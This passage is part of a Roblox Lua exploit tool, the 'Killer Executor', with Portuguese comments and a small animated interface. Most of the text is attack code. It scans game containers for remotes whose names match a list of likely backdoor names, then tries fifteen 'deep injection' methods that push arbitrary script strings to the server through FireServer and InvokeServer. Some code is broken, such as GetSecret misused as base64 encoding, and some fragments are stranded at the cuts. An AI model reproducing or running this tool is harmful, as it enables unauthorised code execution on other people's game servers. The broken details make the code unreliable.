        Duration = duration or 3;
    })
end

-- Função para tocar som de inicialização (GARANTIDO)
local function playInitSound()
    spawn(function()
        wait(0.1)
        pcall(function()
            local sound = Instance.new("Sound")
            sound.Name = "KillerExecutorSound"
            sound.SoundId = executeSound
            sound.Volume = 0.7
            sound.Playing = true
            sound.Parent = game:GetService("SoundService")
            sound:Play()
            
            sound.Ended:Connect(function()
                wait(1)
                sound:Destroy()
            end)
            
            -- Força o som a tocar
            task.wait(0.1)
            if not sound.IsPlaying then
                sound:Play()
            end
        end)
    end)
end

-- Animação de gradiente rotativo

        MainGradient.Rotation = (MainGradient.Rotation + 1) % 360
    end
end)

-- Atualizar tempo de sessão
spawn(function()
    while wait(1) do
        local elapsed = tick() - SessionStart
        local hours = math.floor(elapsed / 3600)
        local minutes = math.floor((elapsed % 3600) / 60)
        local seconds = math.floor(elapsed % 60)
        SessionTimeLabel.Text = string.format("⏱️ %02d:%02d:%02d", hours, minutes, seconds)
    end
end)

-- Função para animar botões
local function animateButton(button, scale)
    local tween = TweenService:Create(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = button.Size + UDim2.new(0, scale, 0, scale)
    })
    tween:Play()
    wait(0.2)
    local tween2 = TweenService:Create(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = button.Size - UDim2.new(0, scale, 0, scale)
    })
    tween2:Play()
end

-- Função para executar código diretamente
local function executeCode(code)
    local success, err = pcall(function()
        local func = loadstring(code)
        if func then
            func()
        end
    end)
    return success, err
end

-- SISTEMA DE INJEÇÃO PROFUNDA - 15 MÉTODOS DIFERENTES
local function deepInject(remote, script, remoteType)
    local injectionMethods = {
        -- Método 1: FireServer padrão
        function()
            remote:FireServer(script)
        end,
        
        -- Método 2: Com loadstring
        function()
            remote:FireServer(loadstring(script))
        end,
        
        -- Método 3: InvokeServer para RemoteFunctions
        function()
            if remote:IsA("RemoteFunction") then
                remote:InvokeServer(script)
            end
        end,
        
        -- Método 4: Com comando "Execute"
        function()
            remote:FireServer("Execute", script)
        end,
        
        -- Método 5: Com comando "Run"
        function()
            remote:FireServer("Run", script)
        end,
        
        -- Método 6: Com player como primeiro arg
        function()
            remote:FireServer(LocalPlayer, script)
        end,
        
        -- Método 7: Como tabela {code = script}
        function()
            remote:FireServer({code = script})
        end,
        
        -- Método 8: Como tabela {script = script}
        function()
            remote:FireServer({script = script})
        end,
        
        -- Método 9: JSON encode
        function()
            local HttpService = game:GetService("HttpService")
            remote:FireServer(HttpService:JSONEncode({code = script}))
        end,
        
        -- Método 10: Com múltiplos argumentos
        function()
            remote:FireServer(LocalPlayer, "exec", script)
        end,
        
        -- Método 11: Como string base64
        function()
            local b64 = game:GetService("HttpService"):GetSecret(script)
            remote:FireServer(b64)
        end,
        
        -- Método 12: Comando "load"
        function()
            remote:FireServer("load", script)
        end,
        
        -- Método 13: Comando "do"
        function()
            remote:FireServer("do", script)
        end,
        
        -- Método 14: Wrapped em função
        function()
            remote:FireServer(function() loadstring(script)() end)
        end,
        
        -- Método 15: Com delay
        function()
            wait(0.05)
            remote:FireServer(script)
        end,
    }
    
    -- Tenta todos os métodos
    for i, method in ipairs(injectionMethods) do
        local success = pcall(method)
        if success then
            return true, i
        end
        wait(0.03) -- Pequeno delay entre tentativas
    end
    
    return false, 0
end

-- Função para tentar executar em TODOS os backdoors com injeção profunda
local function executeOnAllBackdoors(script)
    local successCount = 0
    local totalAttempts = 0
    local methodsUsed = {}
    
    -- Tenta no backdoor criado primeiro
    if createdBackdoor then
        totalAttempts = totalAttempts + 1
        local success = pcall(function()
            createdBackdoor.remote:Fire(script)
        end)
        if success then
            successCount = successCount + 1
            table.insert(methodsUsed, "Backdoor Criado")
        end
        wait(0.1)
    end
    
    -- Tenta em TODOS os backdoors encontrados com INJEÇÃO PROFUNDA
    for _, bd in ipairs(foundBackdoors) do
        totalAttempts = totalAttempts + 1
        
        if bd.type == "bindable" then
            local success = pcall(function()
                bd.remote:Fire(script)
            end)
            if success then
                successCount = successCount + 1
                table.insert(methodsUsed, bd.name .. " [Bindable]")
            end
        else
            -- USA SISTEMA DE INJEÇÃO PROFUNDA
            local success, methodNum = deepInject(bd.remote, script, bd.type)
            if success then
                successCount = successCount + 1
                table.insert(methodsUsed, bd.name .. " [Método " .. methodNum .. "]")
            end
        end
        
        wait(0.08)
    end
    
    return successCount, totalAttempts, methodsUsed
end

-- Função para escanear backdoors
local function scanForBackdoors()
    foundBackdoors = {}
    
    for _, child in ipairs(BackdoorPanel:GetChildren()) do
        if child:IsA("Frame") then
            child:Destroy()
        end
    end
    
    updateStatus("🔍 Escaneando profundamente...", Color3.fromRGB(255, 200, 50))
    
    local backdoorNames = {
        "MainEvent", "RemoteEvent", "RemoteFunction", "Event", "Remote",
        "MainRemote", "Bindable", "RE", "RF", "Backdoor", "Admin",
        "AdminPanel", "AdminCommands", "CommandBar", "HD_AdminPanel",
        "Hint", "Message", "RemoteControl", "ServerControl", "Service",
        "Connection", "NetworkEvent", "ServerEvent", "ClientEvent",
        "GameEvent", "PlayerEvent", "CustomEvent", "Signal", "Trigger"
    }
    
    local function searchInContainer(container)
        pcall(function()
            for _, obj in ipairs(container:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                    for _, name in ipairs(backdoorNames) do
                        if string.find(obj.Name:lower(), name:lower()) then
                            table.insert(foundBackdoors, {name = obj.Name, remote = obj, type = "remote"})
                            break
                        end
                    end
                    
                    if #obj.Name <= 3 or obj.Name:match("%d+") then
                        table.insert(foundBackdoors, {name = obj.Name, remote = obj, type = "remote"})
                    end
                end
            end
        end)
    end
    
    searchInContainer(ReplicatedStorage)
    searchInContainer(game.Workspace)
    pcall(function() searchInContainer(game.Lighting) end)
    pcall(function() searchInContainer(game.ServerStorage) end)
    
    wait(2)
    
    if #foundBackdoors > 0 then
        updateStatus("✅ " .. #foundBackdoors .. " backdoor(s) encontrado(s)!", Color3.fromRGB(50, 200, 50))
        notify("🔓 DETECTADOS", #foundBackdoors .. " backdoors!", 4)
        
        for _, bd in ipairs(foundBackdoors) do
            addBackdoorToList(bd.name, bd.remote, bd.type)
        end
    else
        updateStatus("❌ Nenhum backdoor encontrado!", Color3.fromRGB(200, 50, 50))
        notify("⚠️ NADA", "Nenhum backdoor!", 4)
    end
end
